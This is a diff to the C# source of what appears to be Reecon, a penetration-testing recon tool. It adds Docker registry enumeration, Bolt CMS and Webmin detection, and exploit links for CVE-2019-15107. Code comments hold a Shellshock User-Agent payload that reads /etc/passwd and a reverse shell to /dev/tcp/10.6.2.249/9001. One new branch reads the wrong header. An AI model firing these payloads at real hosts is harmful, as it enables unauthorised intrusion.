@@ -215,6 +215,7 @@ namespace Reecon
             string wildcardURL = url + "be0df04b-f5ff-4b4f-af99-00968cf08fed";
             bool ignoreRedirect = false;
             bool ignoreForbidden = false;
+            bool ignoreBadRequest = false;
             try
             {
                 // Console.WriteLine("Testing Wildcard");
@@ -228,12 +229,17 @@ namespace Reecon
                 else if (pageResult.StatusCode == HttpStatusCode.Redirect || pageResult.StatusCode == HttpStatusCode.Moved)
                 {
                     ignoreRedirect = true;
-                    returnText += $"- Wildcard paths such as {wildcardURL} redirect - This may cause issues..." + Environment.NewLine;
+                    returnText += $"- Wildcard paths such as {wildcardURL} redirect (HTTP Response 302) - This may cause issues..." + Environment.NewLine;
                 }
                 else if (pageResult.StatusCode == HttpStatusCode.Forbidden)
                 {
                     ignoreForbidden = true;
-                    returnText += $"- Wildcard paths such as {wildcardURL} are forbidden - This may cause issues..." + Environment.NewLine;
+                    returnText += $"- Wildcard paths such as {wildcardURL} are forbidden (HTTP Response 403) - This may cause issues..." + Environment.NewLine;
+                }
+                else if (pageResult.StatusCode == HttpStatusCode.BadRequest)
+                {
+                    ignoreBadRequest = true;
+                    returnText += $"- Wildcard paths such as {wildcardURL} return a bad request (HTTP Response 400) - This may cause issues..." + Environment.NewLine;
                 }
             }
             catch { }
@@ -309,7 +315,9 @@ namespace Reecon
                 "cgi-bin/", // Test: curl -H "User-Agent: () { :;}; echo; /bin/cat /etc/passwd;" http://1.2.3.4/cgi-bin/valid.cgi
                            // Shell: curl -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.6.2.249/9001 0>&1;" http://10.10.175.194/cgi-bin/valid.cgi
                 // Well-Known
-                ".well-known/" // https://www.google.com/.well-known/security.txt
+                ".well-known/", // https://www.google.com/.well-known/security.txt
+                // Docker
+                "version"
             };
 
             if (skipPHP)
@@ -343,6 +351,19 @@ namespace Reecon
                                         }
                                     }
                                 }
+                                // Bolt
+                                else if (file == "bolt-public/img/bolt-logo.png")
+                                {
+                                    returnText += "-- Bolt CMS!".Pastel(Color.Orange) + Environment.NewLine;
+                                    returnText += $"-- Admin Page: {url}bolt" + Environment.NewLine;
+                                    returnText += "-- If you get details and the version is 3.6.* or 3.7: https://www.rapid7.com/db/modules/exploit/unix/webapp/bolt_authenticated_rce OR https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py/blob/master/exploit.py (3.7.0)" + Environment.NewLine;
+                                }
+                                // Docker Engine
+                                else if (file == "version" && pageText.Contains("Docker Engine - Community"))
+                                {
+                                    returnText += "-- Docker Engine Found!".Pastel(Color.Orange) + Environment.NewLine;
+                                    returnText += $"--- Run: docker -H tcp://iphere:portHere ps" + Environment.NewLine;
+                                }
                                 // Git repo!
                                 else if (file == ".git/HEAD")
                                 {
@@ -360,22 +381,16 @@ namespace Reecon
                                             // -nH: So you only have the ".git" folder and not the IP folder as well
                                             returnText += $"--- Download the repo: wget -q -r -np -nH {url}.git/" + Environment.NewLine;
                                             returnText += "--- Get the logs: git log --pretty=format:\"%h - %an (%ae): %s %b\"" + Environment.NewLine;
+                                            // git log --pretty=format:"%h - %an (%ae): %s %b"
                                             returnText += "--- Show a specific commit: git show 2eb93ac (Press q to close)" + Environment.NewLine;
                                             continue;
                                         }
                                     }
                                     catch { }
-                                    returnText += "--- Download: https://raw.githubusercontent.com/arthaud/git-dumper/master/git-dumper.py" + Environment.NewLine;
-                                    returnText += $"--- Run: python3 git-dumper.py {url}{file} .git" + Environment.NewLine;
+                                    returnText += "--- Download: https://raw.githubusercontent.com/arthaud/git-dumper/master/git_dumper.py" + Environment.NewLine;
+                                    returnText += $"--- Run: python3 git_dumper.py {url}{file} .git" + Environment.NewLine;
                                     returnText += "--- Get the logs: git log --pretty=format:\"%h - %an (%ae): %s %b\"" + Environment.NewLine;
                                     returnText += "--- Show a specific commit: git show 2eb93ac (Press q to close)" + Environment.NewLine;
-                                }
-                                // Bolt
-                                else if (file == "bolt-public/img/bolt-logo.png")
-                                {
-                                    returnText += "-- Bolt CMS!" + Environment.NewLine;
-                                    returnText += $"-- Admin Page: {url}bolt" + Environment.NewLine;
-                                    returnText += "-- If you get details and the version is 3.6.* or 3.7: https://www.rapid7.com/db/modules/exploit/unix/webapp/bolt_authenticated_rce" + Environment.NewLine;
                                 }
                                 // Kibana!
                                 else if (file == "app/kibana")
@@ -412,7 +427,7 @@ namespace Reecon
                                 {
                                     if (response.PageTitle.StartsWith("Index of /"))
                                     {
-                                        returnText += "-- " + "Open directory listing".Pastel(Color.Orange);
+                                        returnText += "-- " + "Open directory listing".Pastel(Color.Orange) + Environment.NewLine;
                                     }
                                     else
                                     {
@@ -429,6 +444,14 @@ namespace Reecon
                         catch (Exception ex)
                         {
                             Console.WriteLine("Bug Reelix - HTTP.FindCommonFiles Error: " + ex.Message + Environment.NewLine);
+                        }
+                    }
+                    else if (response.StatusCode == HttpStatusCode.BadRequest)
+                    {
+                        // Bad Request is still useful - Unless we're ignoring it
+                        if (!ignoreBadRequest)
+                        {
+                            returnText += $"- Common Path is a Bad Request: {url}{file}" + Environment.NewLine;
                         }
                     }
                     else if (response.StatusCode == HttpStatusCode.Forbidden)
@@ -465,13 +488,51 @@ namespace Reecon
                     }
                     else if (response.StatusCode == 0)
                     {
-                        Console.WriteLine("The HTTP Host is timing out :<");
                         returnText += $"- " + "Host timed out - Unable to enumerate".Pastel(Color.Red);
                         break;
                     }
                     else if (response.StatusCode == HttpStatusCode.InternalServerError)
                     {
                         returnText += $"- Common path throws an Internal Server Error: {url}{file}" + Environment.NewLine;
+                    }
+                    else if (response.StatusCode == HttpStatusCode.NotFound && response.Headers.AllKeys.Contains("Docker-Distribution-Api-Version"))
+                    {
+                        string dockerVersion = response.Headers["Docker-Distribution-Api-Version"];
+                        returnText += "-- Docker Detected - API Version: " + dockerVersion + Environment.NewLine;
+                        if (dockerVersion == "registry/2.0")
+                        {
+                            WebClient wc = new WebClient();
+                            string repoText = wc.DownloadString($"{url}v2/_catalog");
+                            if (repoText.Contains("repositories"))
+                            {
+                                try
+                                {
+                                    var repoList = JsonDocument.Parse(repoText);
+                                    foreach (var item in repoList.RootElement.GetProperty("repositories").EnumerateArray())
+                                    {
+                                        returnText += "--- Repo Found: " + item  + Environment.NewLine;
+                                        string tagList = wc.DownloadString($"{url}v2/" + item + "/tags/list");
+                                        tagList = tagList.Replace("\r", "").Replace("\n", ""); // Sometimes has a built in newline for some reason
+                                        returnText += "---- Tags Found: " + tagList + Environment.NewLine;
+                                        // /v2/cmnatic/myapp1/tags/list
+                                        // --> /cmnatic/myapp1/manifests/notsecure
+                                    }
+                                    returnText += $"------> {url}v2/repo/app/manifests/tagnamehere";
+                                    // Every notfound will be the same
+                                    break;
+                                }
+                                catch
+                                {
+                                    returnText += "--- Unable to deserialize repo - Bug Reelix!" + Environment.NewLine;
+                                    break;
+                                }
+                            }
+                            returnText += repoText;
+                        }
+                        else
+                        {
+                            returnText += "-- Unknown Docker API Version - Bug Reelix!";
+                        }
                     }
                     else if (response.StatusCode != HttpStatusCode.NotFound)
                     {
@@ -528,7 +589,7 @@ namespace Reecon
             return returnText.Trim(Environment.NewLine.ToArray());
         }
 
-        public static (HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, WebHeaderCollection Headers, X509Certificate2 SSLCert, string URL, string AdditionalInfo) GetHTTPInfo(string url)
+        public static (HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, WebHeaderCollection Headers, X509Certificate2 SSLCert, string URL, string AdditionalInfo) GetHTTPInfo(string url, string userAgent = null)
         {
             string pageTitle = "";
             string pageText = "";
@@ -539,6 +600,10 @@ namespace Reecon
             // X509Certificate2 customCert = new CustomSSLCert();
 
             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
+            if (userAgent != null)
+            {
+                request.UserAgent = userAgent;
+            }
             try
             {
                 // Ignore invalid SSL Cert
@@ -843,6 +908,7 @@ namespace Reecon
             {
                 responseText += "- DNS: " + DNS + Environment.NewLine;
             }
+            // Headers!
             if (headerList.Any())
             {
                 headerList = Headers.AllKeys.ToList();
@@ -854,11 +920,12 @@ namespace Reecon
                     responseText += "- Server: " + serverText + Environment.NewLine;
                     if (serverText.StartsWith("MiniServ/"))
                     {
-                        responseText += "-- Webmin Server Detected" + Environment.NewLine;
+                        responseText += "-- " + "Webmin Server Detected".Pastel(Color.Orange) + Environment.NewLine;
                         // 1.890, 1.900-1.920 - http://www.webmin.com/changes.html
                         if (serverText.StartsWith("MiniServ/1.890") || serverText.StartsWith("MiniServ/1.900") || serverText.StartsWith("MiniServ/1.910") || serverText.StartsWith("MiniServ/1.920"))
                         {
-                            responseText += "--- Possible Vulnerable Version: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/webmin_backdoor.rb" + Environment.NewLine;
+                            responseText += "--- " + "Version Likely vulnerable to CVE-2019-15107!!".Pastel(Color.Orange) + Environment.NewLine;
+                            responseText += "---- git clone https://github.com/MuirlandOracle/CVE-2019-15107 OR https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/webmin_backdoor.rb" + Environment.NewLine;
                         }
                     }
                     else if (serverText.StartsWith("Werkzeug/"))
@@ -876,6 +943,12 @@ namespace Reecon
                     {
                         responseText += "-- " + "JBoss Detected - Run jexboss - https://github.com/joaomatosf/jexboss <-----".Pastel(Color.Orange) + Environment.NewLine;
                     }
+                }
+                if (headerList.Contains("X-Generator"))
+                {
+                    headerList.Remove("X-Generator");
+                    string generator = Headers.Get("X-Powered-By");
+                    responseText += "- X-Generator: " + generator + Environment.NewLine;
                 }
                 // Requires a login
                 if (headerList.Contains("WWW-Authenticate"))
